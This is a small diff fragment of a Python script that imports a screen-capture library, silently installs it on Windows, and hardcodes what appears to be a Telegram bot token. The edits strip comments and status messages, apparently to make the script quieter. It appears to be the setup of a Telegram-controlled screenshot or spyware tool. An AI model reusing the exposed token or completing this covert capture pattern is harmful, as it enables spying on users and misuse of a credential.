@@ -7,15 +7,11 @@ import shutil
 import socket
 import sys
 
-# Проверяем и устанавливаем библиотеки
 try:
     from PIL import ImageGrab
 except ImportError:
-    print("Установка библиотек...")
     if platform.system().startswith("Windows"):
         os.system("python -m pip install pillow -q -q -q")
-    else:
-        os.system("python3 -m pip install pillow -q -q -q")
     from PIL import ImageGrab
 
 BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
